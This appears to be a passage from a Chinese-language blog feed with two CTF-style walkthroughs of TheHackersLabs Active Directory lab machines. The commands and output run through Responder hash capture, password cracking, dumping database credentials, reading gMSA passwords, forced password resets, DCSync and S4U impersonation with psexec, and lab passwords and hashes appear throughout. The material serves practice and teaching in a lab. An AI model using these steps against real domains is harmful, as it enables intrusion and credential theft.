| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   192.168.56.116\SQLEXPRESS:
|     Instance name: SQLEXPRESS
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 57936
|_    Clustered: false
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   192.168.56.116\SQLEXPRESS:
|     Target_Name: CONS
|     NetBIOS_Domain_Name: CONS
|     NetBIOS_Computer_Name: WIN-C73PROQLRHL
|     DNS_Domain_Name: cons.thl
|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
60031/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-19T11:42:32
|_  start_date: 2025-07-19T18:29:12
|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.56.116

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.59 seconds
```

### 枚举测试

测试 `SMB` 匿名账户

```bash
➜  Curiosity2 nxc smb cons.thl -u anonymous -p ''                                                             
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\anonymous: STATUS_LOGON_FAILURE 
```

再看一眼 `wireshark` ，依旧有 `LLMNR`包，并且从数据包可以看出来是在查询 `SQLserver`

![image.png](/post-images/TheHackersLabsCuriosity2/image1.png)

### Responder

我们开启 `Responder` 不一会就就能抓到 `HASH`

![image.png](/post-images/TheHackersLabsCuriosity2/image2.png)

开局的思路和`Curiosity`差不多

我们尝试将`HASH`进行爆破

```bash
hashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt
```

得到密码`au7umn@`

![image.png](/post-images/TheHackersLabsCuriosity2/image3.png)

测试凭据

```bash
➜  Curiosity2 nxc smb cons.thl -u sqldb -p 'au7umn@'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ 

➜  Curiosity2 nxc ldap cons.thl -u sqldb -p 'au7umn@'
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ 

➜  Curiosity2 nxc winrm cons.thl -u sqldb -p 'au7umn@'
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ (Pwn3d!)
```

## 脱库

根据用户名，该用户应该是对数据库有一定权限

```bash
*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT @@VERSION"

------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT name FROM sys.databases"
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB
toolsdb

(6 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;SELECT name FROM sys.tables"
Changed database context to 'CredentialsDB'.
name
--------------------------------------------------------------------------------------------------------------------------------
Credentials

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;SELECT * FROM Credentials"
Changed database context to 'CredentialsDB'.
ID          Username                                           Password
----------- -------------------------------------------------- -------------------------------------------------------------
          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;SELECT name FROM sys.tables"
Msg 916, Level 14, State 2, Server WIN-C73PROQLRHL\SQLEXPRESS, Line 1
The server principal "CONS\sqldb" is not able to access the database "toolsdb" under the current security context.
```

拿到 `sqlsvc` 的密码`MD5`值，拿去破解，还可以发现

得到密码 `$PRING2021#`

```bash
➜  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
$PRING2021#      (?)     
1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s $pr1ng..$umm3r2021%
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

测试`sqlsvc`的凭据

```bash
➜  Curiosity2 nxc winrm cons.thl -u sqlsvc -p '$PRING2021#'
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021# (Pwn3d!)
➜  Curiosity2 nxc ldap cons.thl -u sqlsvc -p '$PRING2021#'
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021# 
➜  Curiosity2 nxc smb cons.thl -u sqlsvc -p '$PRING2021#'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021#
```

## KeePass - 1

使用`WinRM`登陆上去后，目录中有一个`Database.kdbx`

是`KeePass`的文件

```bash
*Evil-WinRM* PS C:\Users\sqlsvc\Documents> ls

    Directory: C:\Users\sqlsvc\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
```

我们尝试一下使用`KeePass` 来打开，需要密码

![image.png](/post-images/TheHackersLabsCuriosity2/image4.png)

没有密码，先放着

## 横向移动

### 域分析

上 `BloodHound`

用户很多，所以这里直接筛选了远程管理组（REMOTE MANAGMENT US）的用户

![image.png](/post-images/TheHackersLabsCuriosity2/image5.png)

能发现 `SQLSVC` 能直接修改 `GMSA_SQL`的密码

![image.png](/post-images/TheHackersLabsCuriosity2/image6.png)

然后 `GMSA_SQL` 还可以修改 `TOOLSDB` （上边有一个同名数据库，我们无权限访问）的密码

总结起来就是

![image.png](/post-images/TheHackersLabsCuriosity2/image7.png)

### To Toolsdb

首先读取 `gMSA`的密码

```bash
➜  gMSADumper python gMSADumper.py -u sqlsvc -p '$PRING2021#' -d cons.thl  
Users or groups who can read password for GMSA_SQL$:
 > Svc_Accounts
GMSA_SQL$:::0960ee1575670e65d189eb6e685713ca
GMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0
GMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212
```

再通过 `GMSA_SQL` 修改 `TOOLSDB` 的密码

```bash
➜  Curiosity2 bloodyAD -d 'cons.thl' -u 'GMSA_SQL$' -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 set password 'TOOLSDB' 'Password@123'
[+] Password changed successfully!
```

测试凭据

```bash
➜  Curiosity2 nxc smb cons.thl -u TOOLSDB -p 'Password@123'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\TOOLSDB:Password@123 
```

### To Msol & KeePass - 2

我们登陆上`toolsdb` ，并用数据库脱 `toolsdb` 的数据

```bash
*Evil-WinRM* PS C:\Users\toolsdb\Desktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;select name from sys.tables"
Changed database context to 'toolsdb'.
name
--------------------------------------------------------------------------------------------------------------------------------
users

(1 rows affected)

*Evil-WinRM* PS C:\Users\toolsdb\Desktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;select * from users"
Changed database context to 'toolsdb'.
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 user_6B482050                                      433129A1!@1
          2 user_47F7501A                                      64409A1C!@1
          3 user_515A0C58                                      CAD616E3!@1
          4 user_CA843BF2                                      731C60AD!@1
          5 user_AA2B9FF8                                      8E181E5F!@1
          6 user_F6E6A108                                      47862562!@1
          7 user_8D56BAE8                                      425B6335!@1
          8 user_BA9B1295                                      E4FC1AC4!@1
          9 user_66B7DBEE                                      4EE216A3!@1
         10 user_E75B7C23                                      4CD89A92!@1

(10 rows affected)
```

给了一组密码，感觉是 `KeePass` 文件的密码

```bash
433129A1!@1
64409A1C!@1
CAD616E3!@1
731C60AD!@1
8E181E5F!@1
47862562!@1
425B6335!@1
E4FC1AC4!@1
4EE216A3!@1
4CD89A92!@1
```

最后使用`8E181E5F!@1`成功解密

![image.png](/post-images/TheHackersLabsCuriosity2/image8.png)

得到用户 `MSOL` 用户密码 `YRax2Ry8g2ITQ3hpRPze`

测试凭据

```bash
➜  Curiosity2 nxc smb cons.thl -u MSOL -p 'YRax2Ry8g2ITQ3hpRPze'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\MSOL:YRax2Ry8g2ITQ3hpRPze 
```

### To Administrator

查看权限，oiiaioiiiai

![image.png](/post-images/TheHackersLabsCuriosity2/image9.png)

我们对域有`GetChangeAll`

直接`Dump`

![image.png](/post-images/TheHackersLabsCuriosity2/image10.png)

读取 `user.txt` 和 `root.txt`

```bash
*Evil-WinRM* PS C:\Users\appolonia\Documents> cat User.flag.txt
de4xxxxxxxxxxxxxxxxxxxx

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root.flag.txt
372xxxxxxxxxxxxxxxxxxxx
```

## 总结

没有卡点，酣畅淋漓，一把梭哈

现在就`Curiosity3`把我卡住了]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>Responder</category>
            <category>MSSQL</category>
            <category>gMSA</category>
            <category>KeePass</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Curiosity]]></title>
            <link>https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity</guid>
            <pubDate>Sat, 19 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Curiosity https://labs.thehackerslabs.com/machine/23 Recon PortScan nmap 端口扫描 UDP 也扫描 枚举测试 因为没有 Web 端口，我们从 SMB 服务开始枚举 测试匿名账户 在这里尝试枚举了很久，没结果 responder ...]]></description>
            <content:encoded><![CDATA[
# Curiosity

> https://labs.thehackerslabs.com/machine/23
> 

![image.png](/post-images/TheHackersLabsCuriosity/image.png)

## Recon

### PortScan

`nmap` 端口扫描

```bash
➜  Curiosity nmap -sT -min-rate 10000 -p- 192.168.56.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:28 CST
Warning: 192.168.56.8 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.8
Host is up (0.00052s latency).
Not shown: 64857 closed tcp ports (conn-refused), 653 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49683/tcp open  unknown
49695/tcp open  unknown
49703/tcp open  unknown
49704/tcp open  unknown
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

`UDP` 也扫描

```bash
➜  Curiosity nmap -sU -min-rate 10000 -p- 192.168.56.8                                                                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:35 CST
Warning: 192.168.56.8 giving up on port because retransmission cap hit (10).
Nmap scan report for hackme.thl (192.168.56.8)
Host is up (0.032s latency).
Not shown: 65449 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
➜  Curiosity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:29 CST
Nmap scan report for 192.168.56.8
Host is up (0.00050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 05:30:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-19T05:31:14
|_  start_date: 2025-07-19T11:20:37
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:94:ab:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.8
```

### 枚举测试

因为没有 `Web` 端口，我们从  `SMB` 服务开始枚举

测试匿名账户

```bash
➜  Curiosity smbclient -L 192.168.56.8 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

在这里尝试枚举了很久，没结果

### responder

打开 `Wireshark` 抓包看看

看到`LLMNR`，让我想起了`NTLM`中继攻击

![image.png](/post-images/TheHackersLabsCuriosity/image1.png)

打开 `responder` 

```bash
responder -I eth2
```

抓到 `jdoe` 的 `NET-NTLM hash`

![image.png](/post-images/TheHackersLabsCuriosity/image2.png)

使用 `hashcat` 进行爆破

```bash
hashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt 
```

得到密码`$pr1ng@`

![image.png](/post-images/TheHackersLabsCuriosity/image3.png)

测试凭据

```bash
➜  Curiosity nxc smb hackme.thl -u jdoe -p '$pr1ng@'                                                         
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.8    445    DC               [+] hackme.thl\jdoe:$pr1ng@ 
➜  Curiosity nxc ldap hackme.thl -u jdoe -p '$pr1ng@'
LDAP        192.168.56.8    389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)
LDAP        192.168.56.8    389    DC               [+] hackme.thl\jdoe:$pr1ng@ 
➜  Curiosity nxc winrm hackme.thl -u jdoe -p '$pr1ng@'
WINRM       192.168.56.8    5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.8    5985   DC               [+] hackme.thl\jdoe:$pr1ng@ (Pwn3d!)
```

当前用户可以拿到 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\jdoe\Desktop> cat user.txt
{bdxxxxxxxxxxxxxxxxxxxxxxx
```

## 域分析

收集数据

```bash
➜  Curiosity bloodhound-python -d 'hackme.thl' -ns 192.168.56.8 --zip -c All -dc 'DC.hackme.thl' -u jdoe -p '$pr1ng@'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hackme.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC.hackme.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC.hackme.thl
INFO: Found 17 users
INFO: Found 67 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.hackme.thl
INFO: Connecting to GC LDAP server: DC.hackme.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250719140452_bloodhound.zip
```

上 `BLoodhound`

用户组信息

![image.png](/post-images/TheHackersLabsCuriosity/image4.png)

`jdoe` 用户信息

![image.png](/post-images/TheHackersLabsCuriosity/image5.png)

拥有强制修改`DBA_ADM` 的权限

![image.png](/post-images/TheHackersLabsCuriosity/image6.png)

## 横向移动

### To DBA_ADM

通过 `bloodyAD` 来修改其密码，失败了 ❌

![image.png](/post-images/TheHackersLabsCuriosity/image7.png)

我们远程上去通过 `PowerShell` 改 

```bash
$SecPassword = ConvertTo-SecureString '$pr1ng@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HACKME\jdoe', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
. ./PowerView.ps1
Set-DomainUserPassword -Identity DBA_ADM -AccountPassword $UserPassword -Credential $Cred
```

测试凭据

![image.png](/post-images/TheHackersLabsCuriosity/image8.png)

### To sqlsvc

![image.png](/post-images/TheHackersLabsCuriosity/image9.png)

```bash
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/18/2024   8:34 AM                Administrator
d-----       10/17/2024   4:53 PM                dba_adm
d-----       10/17/2024   2:56 PM                jdoe
d-----       10/17/2024   7:49 PM                MSSQL$SQLEXPRESS
d-r---        9/12/2016   1:37 PM                Public
d-----       10/18/2024   5:46 PM                sqlsvc
d-----       10/17/2024   7:49 PM                SQLTELEMETRY$SQLEXPRESS
```

`winpeas` 枚举时能看到数据库的管道

![image.png](/post-images/TheHackersLabsCuriosity/image10.png)

我们的用户应该是可以和数据库进行交互的

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT @@VERSION"

--------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)

(1 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "select name FROM sys.databases"
name
-------------------------------------------------------------------------------------------
tempdb
model
msdb
CredentialsDB

(5 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;select name from  sys.tables"
Changed database context to 'CredentialsDB'.
name
--------------------------------------------------------------------------------------------------------------------------------
Credentials

(1 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;select * from Credentials"
Changed database context to 'CredentialsDB'.
ID          Username                                           Password
----------- -------------------------------------------------- ---------------------------------------------
          1 sqlsvc                                             23012244084524e51305f015727b890b

(1 rows affected)
```

这样就读到了`sqlsvc`用户的密码

到在线网站进行破解，得到密码 `P@ssword1234!`

![image.png](/post-images/TheHackersLabsCuriosity/image11.png)

测试凭据

```bash
➜  Curiosity nxc smb hackme.thl -u sqlsvc -p 'P@ssword1234!'
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.8    445    DC               [+] hackme.thl\sqlsvc:P@ssword1234! 
```

### To GMSA_SVC$

`SQLSVC` 账户可以读取 `GMAS` 密码

![image.png](/post-images/TheHackersLabsCuriosity/image12.png)

读取 `gMSA` 的密码

```bash
➜  gMSADumper python gMSADumper.py -u sqlsvc -p 'P@ssword1234!' -d hackme.thl
Users or groups who can read password for GMSA_SVC$:
 > GMSA_USERS
GMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0
GMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66
GMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921
```

### To Administrator

我们寻找路径，发现`GMSA_SVC$` 对 `DC` 有 `AllowToAct` 权限

![image.png](/post-images/TheHackersLabsCuriosity/image13.png)

`AllowToAct` 就是 `AllowedToActOnBehalfOfOtherIdentity` ，`GMSA_SVC` 已添加到 `DC.HACKME.THL` 上的 `msds-AllowedToActOnBehalfOfOtherIdentity` 属性中

```bash
➜  Curiosity getST.py -spn 'cifs/DC.hackme.thl' -impersonate 'administrator' 'hackme.thl/GMSA_SVC$' -hashes :e1eef5023c307890fdbb047e6554cfd0
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.hackme.thl@HACKME.THL.ccache
```

```bash
➜  Curiosity export KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache 

➜  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.hackme.thl.....
[*] Found writable share ADMIN$
[*] Uploading file vgKATdFu.exe
[*] Opening SVCManager on dc.hackme.thl.....
[*] Creating service VDYV on dc.hackme.thl.....
[*] Starting service VDYV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

读取 `root.txt`

```bash
C:\Users\Administrator\Desktop> type root.txt
24axxxxxxxxxxxxxxxxxxxxxxxxx
```

## 总结

不算难，除了爆破的字典有点不明所以

最后一步，直接看 `GMSA_SVC$` 的 `OutBound Execution`是空的，但自己寻找路径又能找到就有点奇怪

下面的脚本为什么我们可以截取到 `jdoe` 用户的`NET NTLM HASH`

```bash
*Evil-WinRM* PS C:\temp> cat shareconnect.ps1

while ($true) {
    # Comando net use para reconectar el recurso compartido
    net use Z: \\SQLserver\bbdd /user:hackme\jdoe '$pr1ng@'

    # Espera de 1 minuto antes de volver a ejecutar
    Start-Sleep -Seconds 60
}
```]]></content:encoded>
